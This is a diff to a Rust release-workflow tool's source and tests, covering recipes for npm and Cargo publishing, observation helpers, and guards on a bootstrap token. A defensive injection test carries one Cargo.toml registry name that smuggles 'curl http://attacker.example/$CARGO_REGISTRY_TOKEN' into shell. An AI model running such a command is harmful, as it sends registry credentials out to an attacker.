@@ -1391,16 +1391,26 @@ fn publisher_permissions(publication: &SelectedPublication) -> String {
 }
 
 /// Whether one publication's recipe presents the run's workflow identity.
+///
+/// Every adapter states its own answer rather than sharing a catch-all. The
+/// adapters below npm and Cargo are owned by separate tasks working from a
+/// common base, and a catch-all makes an answer each of them has to give
+/// separately into one they have to change together.
 fn presents_a_workflow_identity(publication: &SelectedPublication) -> bool {
     match (publication.publisher, publication.target.as_str()) {
         // GitHub Package Registry implements neither trusted publishing nor
         // provenance attestation; its recipe presents the workflow token.
         (PublisherKind::Npm, "github") => false,
+        (PublisherKind::Npm, _) => true,
         // An alternate Cargo registry defines its own trusted publishing, if
         // any, so the maintained recipe authenticates it with a configured
         // token. Only crates.io performs the identity exchange.
         (PublisherKind::Cargo, _) => publication.destination.as_deref() == Some("crates.io"),
-        _ => true,
+        (PublisherKind::Homebrew, _) => true,
+        (PublisherKind::Rpm, _) => true,
+        (PublisherKind::Apt, _) => true,
+        (PublisherKind::Aur, _) => true,
+        (PublisherKind::Oci, _) => true,
     }
 }
 
@@ -1845,6 +1855,7 @@ mod tests {
     use super::*;
     use crate::evidence::assemble::CleanClientMode;
     use crate::executor::fixture::Workspace;
+    use crate::publication::observation::ObservationState;
     use std::collections::BTreeMap;
 
     const CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
@@ -3601,7 +3612,7 @@ release-units:
             )
             .write(
                 "component/package.json",
-                r#"{"name":"example-component","version":"1.0.0"}"#,
+                r#"{"name":"@example-owner/example-component","version":"1.0.0"}"#,
             );
         std::fs::remove_file(workspace.root().join("component/Cargo.toml")).expect("remove");
         workspace
@@ -3681,18 +3692,21 @@ release-units:
         }
     }
 
-    // A recipe reports a destination that has not indexed the release yet, and
-    // one holding bytes this release did not promote, by writing an observation
-    // and succeeding: the command that reads it is what turns the first into a
-    // bounded wait and the second into an immediate failure. Both documents are
-    // written by a shell script, so a misspelled member or a state carrying
-    // detail it may not carry is a defect nothing in a Rust test would see and
-    // that a release runner would surface three jobs later, as a verification
-    // failure naming the destination rather than the recipe. The script is
-    // therefore run, and what it wrote is loaded by the same loader the command
-    // uses.
+    // Every observation a recipe writes is written by shell. A misspelled
+    // member, a state carrying detail it may not carry, or a schema identity
+    // edited in one copy and not another is a defect nothing in a Rust test
+    // would see and that a release runner would surface three jobs later, as a
+    // verification failure naming the destination rather than the recipe. The
+    // helpers are therefore executed and what they wrote is loaded by the same
+    // loader the command uses.
+    //
+    // All three documents are driven, and the present one matters most: it
+    // carries the subject, packager, destination and retrieval -- every
+    // affirmative claim the fragment is built from. An earlier version of this
+    // test ran only the two states that carry no detail, and two mutations in
+    // the present path survived the whole suite green.
     #[test]
-    fn writes_an_unobservable_and_a_disagreeing_state_the_loader_accepts() {
+    fn writes_every_observation_state_in_a_form_the_loader_accepts() {
         for (workspace, publisher) in [
             (workspace("workflow-observed-states-cargo"), "cargo"),
             (npm_workspace("workflow-observed-states-npm"), "npm"),
@@ -3704,41 +3718,55 @@ release-units:
                 .expect("the recipe writes an observation");
             let environment = step_environment(&readback);
             let body = readback["run"].as_str().expect("a script");
-            // Everything up to the observation helper's closing brace is the
-            // helper and the strict-mode line it sits under. Running more would
-            // reach the registry.
-            let end = body
-                .find("\n}\n")
-                .expect("the observation helper is a shell function");
-            let helper = &body[..end + "\n}\n".len()];
+            let helpers = observation_helpers(body);
 
             let temporary = workspace.root().join("runner");
             std::fs::create_dir_all(&temporary).expect("runner directory");
-            for (state, argument) in [
+            let resolve =
+                |value: &str| value.replace("${{ runner.temp }}", &temporary.display().to_string());
+            // Everything the adapter script computes before it writes a present
+            // observation reaches the helper as a shell variable, so the
+            // document can be driven without reaching a registry. These stand
+            // in for exactly those values.
+            let computed = [
+                ("INTENTIONAL_VERSION", "1.0.0"),
                 (
-                    crate::publication::observation::ObservationState::Pending,
-                    "",
+                    "INTENTIONAL_SUBJECT_DIGEST",
+                    "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+                ),
+                ("INTENTIONAL_PACKAGER_VERSION", "1.2.3"),
+                ("INTENTIONAL_DESTINATION_DIGEST", "a-destination-checksum"),
+                ("INTENTIONAL_RETRIEVAL_VERSION", "1.2.3"),
+                ("INTENTIONAL_RETRIEVED_DIGEST", "a-destination-checksum"),
+            ];
+
+            for (state, call) in [
+                (
+                    ObservationState::Pending,
+                    "INTENTIONAL_observe_state pending",
                 ),
                 (
-                    crate::publication::observation::ObservationState::Conflict,
-                    "another release holds this version",
+                    ObservationState::Conflict,
+                    "INTENTIONAL_observe_state conflict \"another release holds this version\"",
                 ),
+                (ObservationState::Present, "INTENTIONAL_observe_present"),
             ] {
                 let mut command = std::process::Command::new("bash");
-                command.arg("-c").arg(format!(
-                    "{helper}\nINTENTIONAL_observe_state {state} \"{argument}\""
-                ));
+                command.arg("-c").arg(format!("{helpers}\n{call}"));
                 for (key, value) in &environment {
-                    command.env(
-                        key,
-                        value.replace("${{ runner.temp }}", &temporary.display().to_string()),
-                    );
+                    command.env(key, resolve(value));
                 }
-                let status = command.status().expect("the recipe script runs");
-                assert!(status.success(), "{publisher} writes a {state} observation");
+                for (key, value) in computed {
+                    command.env(key, value);
+                }
+                let output = command.output().expect("the recipe script runs");
+                assert!(
+                    output.status.success(),
+                    "{publisher} writes a {state} observation: {}",
+                    String::from_utf8_lossy(&output.stderr)
+                );
 
-                let path = environment["INTENTIONAL_OBSERVATION"]
-                    .replace("${{ runner.temp }}", &temporary.display().to_string());
+                let path = resolve(&environment["INTENTIONAL_OBSERVATION"]);
                 let observed =
                     crate::publication::observation::PublicationObservation::load(Path::new(&path))
                         .unwrap_or_else(|error| {
@@ -3750,8 +3778,44 @@ release-units:
                     format!("component/{publisher}/{PRIMARY_TARGET}"),
                     "the observation names the publication its job publishes"
                 );
+                if state != ObservationState::Present {
+                    continue;
+                }
+                let retrieval = observed.retrieval.expect("a present observation retrieves");
+                assert_eq!(
+                    retrieval.mode,
+                    CleanClientMode::Public,
+                    "the present document records the mode its recipe fixes"
+                );
+                let subject = observed
+                    .subject
+                    .expect("a present observation has a subject");
+                assert_eq!(subject.version, "1.0.0");
+                assert_eq!(
+                    observed
+                        .destination
+                        .expect("a present observation reads back")
+                        .digest,
+                    "a-destination-checksum"
+                );
             }
         }
+    }
+
+    /// The observation helpers one derived recipe script defines, and nothing else.
+    ///
+    /// Running any more of the script would reach a registry. The block ends at
+    /// the last helper's closing brace, which the re-emitted block scalar puts
+    /// in the first column; slicing at the first one instead would stop after
+    /// the header helper and cover neither state.
+    fn observation_helpers(body: &str) -> &str {
+        let present = body
+            .find("INTENTIONAL_observe_present() {")
+            .expect("the recipe defines the present-observation helper");
+        let end = body[present..]
+            .find("\n}\n")
+            .expect("the present-observation helper is a shell function");
+        &body[..present + end + "\n}\n".len()]
     }
 
     // Everything the observation says about the release comes from the build
@@ -3883,6 +3947,261 @@ release-units:
                     "the {target} publisher reads its destination before submitting to it"
                 );
             }
+        }
+    }
+
+    /// A directory holding one stub client that answers a scripted way.
+    ///
+    /// The recipes decide whether to reach a long-lived credential from what a
+    /// registry client tells them, and the three answers that matter differ
+    /// only in an exit status and a line of output. Asserting the decision
+    /// therefore means running the script against a client that gives each
+    /// answer, which is what this builds.
+    fn stub_client(directory: &Path, client: &str, script: &str) -> PathBuf {
+        let path = directory.join(client);
+        std::fs::create_dir_all(directory).expect("stub directory");
+        std::fs::write(
+            &path,
+            format!(
+                "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> \"${{STUB_LOG}}\"\n{script}\nexit 0\n"
+            ),
+        )
+        .expect("stub written");
+        let mut permissions = std::fs::metadata(&path)
+            .expect("stub metadata")
+            .permissions();
+        std::os::unix::fs::PermissionsExt::set_mode(&mut permissions, 0o755);
+        std::fs::set_permissions(&path, permissions).expect("stub is executable");
+        directory.to_path_buf()
+    }
+
+    /// Run one derived step's script with a stub client ahead of it on PATH.
+    fn run_step(
+        step: &Value,
+        stubs: &Path,
+        temporary: &Path,
+        extra: &[(&str, &str)],
+    ) -> (bool, String) {
+        let log = temporary.join("stub.log");
+        std::fs::write(&log, "").expect("stub log");
+        let mut command = std::process::Command::new("bash");
+        command
+            .arg("-c")
+            .arg(step["run"].as_str().expect("a script"))
+            .env(
+                "PATH",
+                format!(
+                    "{}:{}",
+                    stubs.display(),
+                    std::env::var("PATH").unwrap_or_default()
+                ),
+            )
+            .env("STUB_LOG", &log)
+            .env("HOME", temporary)
+            .env("RUNNER_TEMP", temporary)
+            .env("GITHUB_WORKSPACE", temporary)
+            .env("GITHUB_ENV", temporary.join("github.env"));
+        for (key, value) in step_environment(step) {
+            command.env(
+                key,
+                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
+            );
+        }
+        for (key, value) in extra {
+            command.env(key, value);
+        }
+        let output = command.output().expect("the derived script runs");
+        (
+            output.status.success(),
+            std::fs::read_to_string(&log).unwrap_or_default(),
+        )
+    }
+
+    // Two names reach a maintained recipe from repository content rather than
+    // from this derivation: the Cargo registry `package.publish` names, and the
+    // npm package name GitHub Package Registry has to resolve. The first lands
+    // in `run:` bodies that hold the registry token, so a name carrying a quote
+    // is not a registry that fails to resolve, it is shell source a publisher
+    // job executes while holding a credential -- and the derived workflow still
+    // parses as YAML, so every structural assertion in this module passes over
+    // it. The second is refused because the registry will refuse it, in a job
+    // that runs after the primary has already shipped.
+    #[test]
+    fn refuses_a_configured_name_it_would_otherwise_carry_into_a_credentialed_script() {
+        let workspace = workspace("workflow-registry-injection");
+        workspace.write(
+            "component/Cargo.toml",
+            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #\"]\n",
+        );
+        let comparison =
+            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
+        assert_eq!(comparison.status, ComparisonStatus::Blocked);
+        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
+        assert!(
+            comparison.diagnostics[0]
+                .message
+                .contains("is not a registry name"),
+            "{:?}",
+            comparison.diagnostics[0]
+        );
+
+        // The same refusal covers the shape that does not even parse, so the
+        // cause is named rather than reported as an invalid template.
+        workspace.write(
+            "component/Cargo.toml",
+            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\nregistry\"]\n",
+        );
+        let comparison =
+            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
+        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
+
+        let workspace = npm_workspace("workflow-unscoped-github-package");
+        workspace.write(
+            "component/package.json",
+            r#"{"name":"example-component","version":"1.0.0"}"#,
+        );
+        let comparison =
+            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
+        assert_eq!(comparison.status, ComparisonStatus::Blocked);
+        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
+        assert!(
+            comparison.diagnostics[0]
+                .message
+                .contains("under the publishing account's scope"),
+            "{:?}",
+            comparison.diagnostics[0]
+        );
+    }
+
+    // A destination the catalog names has one anonymity. A Cargo primary does
+    // not: it resolves to whatever registry `package.publish` names, ordinarily
+    // a private one, and the recipe authenticates it with a configured token
+    // and then retrieves it with that token in the environment. Recording the
+    // catalog's public default there asserts a consumer path nobody outside the
+    // credential holder could take, which is the untruth the authenticated mode
+    // was introduced to stop -- and the destination that most needed it was the
+    // one that walked past it.
+    #[test]
+    fn records_an_alternate_cargo_registry_as_a_destination_without_anonymous_read() {
+        let workspace = workspace("workflow-alternate-cargo-registry");
+        workspace.write(
+            "component/Cargo.toml",
+            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
+        );
+        converge(workspace.root(), WorkflowRole::Publish);
+
+        let selected = crate::executor::recipe::select_publications(
+            workspace.root(),
+            &Config::load(workspace.root()).expect("configuration loads"),
+        )
+        .expect("publications select");
+        assert_eq!(
+            selected[0].retrieval,
+            CleanClientMode::AuthenticatedRegistry,
+            "an alternate registry admits no anonymous consumer path"
+        );
+
+        let written = publisher_steps(workspace.root(), PRIMARY_TARGET)
+            .iter()
+            .filter_map(|step| {
+                step_environment(step)
+                    .get("INTENTIONAL_RETRIEVAL_MODE")
+                    .cloned()
+            })
+            .collect::<Vec<_>>();
+        assert_eq!(written, vec!["authenticated-registry".to_owned()]);
+
+        // The name never reaches a command as spliced text, whether or not it
+        // would have been safe to splice.
+        for step in publisher_steps(workspace.root(), PRIMARY_TARGET) {
+            let body = step.get("run").and_then(Value::as_str).unwrap_or_default();
+            assert!(
+                !body.contains("--registry example-registry"),
+                "the configured registry name reaches cargo as a quoted variable: {body}"
+            );
+        }
+    }
+
+    // A probe that did not succeed is not evidence of absence. `npm view` and
+    // `cargo add` fail the same way on a missing package, a rate limit, a proxy
+    // failure and a 5xx, and absence is the one condition that unlocks the
+    // long-lived bootstrap token. Collapsing the two turns any transient
+    // registry failure into a steady-state publication authenticated by a
+    // long-lived credential instead of the configured trusted identity -- the
+    // silent fallback the design forbids, arrived at without anything saying
+    // so. The ordering assertion below cannot see this, because it asserts
+    // where the token is read and not what the probe proved, so the script is
+    // run against a client that gives each answer.
+    #[test]
+    fn refuses_a_bootstrap_token_when_the_probe_did_not_answer() {
+        let inconclusive = "npm error network request to https://registry.example failed";
+        for (workspace, client, absent, inconclusive, present) in [
+            (
+                workspace("workflow-probe-cargo"),
+                "cargo",
+                "case \"$1\" in add) echo 'error: the crate could not be found in registry index' >&2; exit 1 ;; esac",
+                "case \"$1\" in add) echo 'error: failed to fetch; connection reset' >&2; exit 1 ;; esac",
+                "",
+            ),
+            (
+                npm_workspace("workflow-probe-npm"),
+                "npm",
+                "case \"$1\" in view) echo 'npm error code E404' >&2; exit 1 ;; esac",
+                &format!("case \"$1\" in view) echo '{inconclusive}' >&2; exit 1 ;; esac"),
+                "case \"$1\" in view) echo 'sha512-abc' ;; esac",
+            ),
+        ] {
+            converge(workspace.root(), WorkflowRole::Publish);
+            let authenticate = publisher_steps(workspace.root(), PRIMARY_TARGET)
+                .into_iter()
+                .find(|step| {
+                    step_environment(step).contains_key("INTENTIONAL_BOOTSTRAP_TOKEN")
+                })
+                .expect("the primary publisher authenticates");
+            let temporary = workspace.root().join("runner");
+            std::fs::create_dir_all(&temporary).expect("runner directory");
+            let token = [("INTENTIONAL_BOOTSTRAP_TOKEN", "a-long-lived-token")];
+
+            let stubs = stub_client(&temporary.join("absent"), client, absent);
+            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
+            assert!(
+                succeeded,
+                "a proven first publication reaches its bootstrap token"
+            );
+            assert!(
+                log.contains("a-long-lived-token")
+                    || std::fs::read_to_string(temporary.join("github.env"))
+                        .unwrap_or_default()
+                        .contains("a-long-lived-token"),
+                "the bootstrap path presents the token: {log}"
+            );
+
+            let stubs = stub_client(&temporary.join("inconclusive"), client, inconclusive);
+            std::fs::write(temporary.join("github.env"), "").expect("reset");
+            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
+            assert!(
+                !succeeded,
+                "a probe that did not answer refuses to decide: {log}"
+            );
+            assert!(
+                !log.contains("a-long-lived-token")
+                    && !std::fs::read_to_string(temporary.join("github.env"))
+                        .unwrap_or_default()
+                        .contains("a-long-lived-token"),
+                "an inconclusive probe never presents the bootstrap token: {log}"
+            );
+
+            if present.is_empty() {
+                continue;
+            }
+            let stubs = stub_client(&temporary.join("present"), client, present);
+            std::fs::write(temporary.join("github.env"), "").expect("reset");
+            let (succeeded, log) = run_step(&authenticate, &stubs, &temporary, &token);
+            assert!(succeeded, "an existing package authenticates: {log}");
+            assert!(
+                !log.contains("a-long-lived-token"),
+                "steady-state publication never presents the bootstrap token: {log}"
+            );
         }
     }
 
